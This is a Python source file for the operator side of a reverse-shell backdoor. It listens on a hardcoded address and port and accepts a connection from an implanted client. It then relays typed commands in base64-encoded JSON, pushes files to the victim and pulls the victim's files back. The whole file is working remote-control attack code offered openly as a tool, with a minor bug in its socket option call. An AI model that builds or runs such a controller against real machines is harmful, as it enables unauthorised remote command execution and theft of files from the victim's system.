import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(0)
        print("[+] Listening for connections")
        self.conn, addr = s.accept()
        print("[+] Connection established from:", addr)

    def recv_reliably(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + base64.b64decode(self.conn.recv(1024)).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_reliably(self, commands):
        json_obj = json.dumps(commands)
        self.conn.send(base64.b64encode(json_obj.encode()))

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"

    def send_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            commands = input("=>").split(' ')
            if commands[0] == "upload":
                content = self.send_file(commands[1])
                content = content.decode()
                commands.append(content)
            self.send_reliably(commands)

            if commands[0] == "exit":
                self.conn.close()
                exit()
            result = self.recv_reliably()
            if commands[0] == "download":
                result = self.write_file(commands[1], result)
            print(result)


my_listener = Listener("192.168.43.13", 8080)
my_listener.run()
